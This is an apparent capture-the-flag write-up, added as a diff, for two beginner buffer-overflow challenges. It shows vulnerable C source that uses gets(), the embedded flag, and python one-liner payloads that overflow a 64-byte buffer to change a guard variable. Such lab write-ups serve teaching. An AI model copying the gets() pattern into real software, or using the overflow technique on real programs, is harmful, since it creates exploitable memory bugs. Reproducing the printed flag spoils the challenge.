@@ -1,0 +1,72 @@
+task 1 :  i’m hungry 
+
+this task is a veary basic buffer over flow vulnerability her’s the code for the binary 
+
+              #include <stdlib.h>
+              #include <unistd.h>	
+              #include <stdio.h>
+              #include <string.h>
+
+              int main(int argc, char **argv)
+            {
+              printf("+--------------------------------------------------------------+\n|                                                              	|\n|    GIVE ME ENOUGH TAJIN I GIVE YOU THE FLAG !!!              |\n|                                                              	|\n+--------------------------------------------------------------+\n");
+                volatile int modified;
+                char buffer[64];
+
+                modified = 0;
+                gets(buffer);
+                if(modified != 0) 
+            {
+              char flag[] = 
+              {
+              HIDE_LETTER('s') , HIDE_LETTER('p') , HIDE_LETTER('4') , HIDE_LETTER('r') , HIDE_LETTER('k') , HIDE_LETTER('{'),
+              HIDE_LETTER('b') , HIDE_LETTER('u') , HIDE_LETTER('f') , HIDE_LETTER('f') , HIDE_LETTER('3') , HIDE_LETTER('r'), 	
+              HIDE_LETTER('_') , HIDE_LETTER('s') , HIDE_LETTER('m') , HIDE_LETTER('a') , HIDE_	LETTER('s'), HIDE_LETTER('h'), 
+              HIDE_LETTER('e') , HIDE_LETTER('d') ,	HIDE_LETTER('_') , HIDE_LETTER('h') , HIDE_LETTER('a') , HIDE_LETTER('h'),
+              HIDE_LETTER('a') , HIDE_LETTER('!') , HIDE_LETTER('}') , HIDE_LETTER('c') , HIDE_LETTER('7') , HIDE_LETTER('f'),
+              '\0' }; 
+              UNHIDE_STRING(flag);
+              printf("good job this is your flag ---> %s \n",&flag);
+              HIDE_STRING(flag);
+                }
+               else 
+              {
+                    printf("MEH !! THAT'S NOT ENOUGH I CAN EAT MORE\n");
+                }
+            }
+
+
+so the program uses « gets() » function wich doesnt have any type of control on the input 
+the objective here  is to overwrite the modified variable to any value other than 0 by passing a random string to « buf » 
+as we can tell buf variable size is 64 so we need to provide a 13 extra character over the 64 predeclared  to overwrite 
+the modified variable 
+
+steps : 
+
+ 1-> python -c « print ‘a’*77 » 
+
+ 2-> ./buf
+
+ 3-> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+ et voila !!!!! here is the flag . 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Task 2 : give me my milk
+
+obviously the program is  he same as task 1  the only difference is that he demand to change the modified variable 
+into a spesefic value wich is « milk » the good thing here is that every time you provide an input a messege appears
+with the value of modified variable so first of all we need to know in wich size of input we got a bufferover flow after 
+some simple tests with random strings we figure out that the buferoverflow hapens after 140 character input so we need 
+to provide 140 characters joined with the word "milk" 
+
+steps 
+
+1 -> python -c "print 'a'*140+'milk'"
+2 -> ./b2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaamilk
+
+ et voila !!!!! here is the flag . 
